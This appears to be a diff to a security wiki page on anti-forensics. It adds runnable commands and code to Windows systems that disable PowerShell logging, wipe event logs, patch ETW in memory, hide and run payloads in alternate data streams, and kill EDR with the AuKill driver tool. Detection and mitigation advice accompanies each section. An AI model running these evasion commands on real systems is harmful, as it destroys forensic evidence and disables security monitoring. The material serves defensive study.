@@ -142,13 +142,96 @@ It's also possible to modify the configuration of which files are going to be co
 
 ### Disable Windows event logs
 
-- `reg add 'HKLM\SYSTEM\CurrentControlSet\Services\eventlog' /v Start /t REG_DWORD /d 4 /f`
+- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
 - Inside the services section disable the service "Windows Event Log"
 - `WEvtUtil.exec clear-log` or `WEvtUtil.exe cl`
 
 ### Disable $UsnJrnl
 
 - `fsutil usn deletejournal /d c:`
+
+---
+
+## Advanced Logging & Trace Tampering (2023-2025)
+
+### PowerShell ScriptBlock/Module Logging
+
+Recent versions of Windows 10/11 and Windows Server keep **rich PowerShell forensic artifacts** under
+`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).  
+Attackers can disable or wipe them on-the-fly:
+
+```powershell
+# Turn OFF ScriptBlock & Module logging (registry persistence)
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
+                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
+                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force
+
+# In-memory wipe of recent PowerShell logs
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
+  Remove-WinEvent               # requires admin & Win11 23H2+
+```
+
+Defenders should monitor for changes to those registry keys and high-volume removal of PowerShell events.
+
+### ETW (Event Tracing for Windows) Patch
+
+Endpoint security products rely heavily on ETW. A popular 2024 evasion method is to
+patch `ntdll!EtwEventWrite`/`EtwEventWriteFull` in memory so every ETW call returns `STATUS_SUCCESS`
+without emitting the event:
+
+```c
+// 0xC3 = RET on x64
+unsigned char patch[1] = { 0xC3 };
+WriteProcessMemory(GetCurrentProcess(),
+                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
+                   patch, sizeof(patch), NULL);
+```
+
+Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive in PowerShell or C++.  
+Because the patch is **process-local**, EDRs running inside other processes may miss it.  
+Detection: compare `ntdll` in memory vs. on disk, or hook before user-mode.
+
+### Alternate Data Streams (ADS) Revival
+
+Malware campaigns in 2023 (e.g. **FIN12** loaders) have been seen staging second-stage binaries
+inside ADS to stay out of sight of traditional scanners:
+
+```cmd
+rem Hide cobalt.bin inside an ADS of a PDF
+type cobalt.bin > report.pdf:win32res.dll
+rem Execute directly
+wmic process call create "cmd /c report.pdf:win32res.dll"
+```
+
+Enumerate streams with `dir /R`, `Get-Item -Stream *`, or Sysinternals `streams64.exe`.
+Copying the host file to FAT/exFAT or via SMB will strip the hidden stream and can be used
+by investigators to recover the payload.
+
+### BYOVD & “AuKill” (2023)
+
+Bring-Your-Own-Vulnerable-Driver is now routinely used for **anti-forensics** in ransomware
+intrusions.  
+The open-source tool **AuKill** loads a signed but vulnerable driver (`procexp152.sys`) to
+suspend or terminate EDR and forensic sensors **before encryption & log destruction**:
+
+```cmd
+AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+AuKill.exe -k CrowdStrike
+```
+
+The driver is removed afterwards, leaving minimal artifacts.  
+Mitigations: enable the Microsoft vulnerable-driver blocklist (HVCI/SAC),
+and alert on kernel-service creation from user-writable paths.
+
+---
+
+## References
+
+- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (March 2023)  
+  https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
+- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (June 2024)  
+  https://redcanary.com/blog/etw-patching-detection
 
 {{#include ../../banners/hacktricks-training.md}}
 
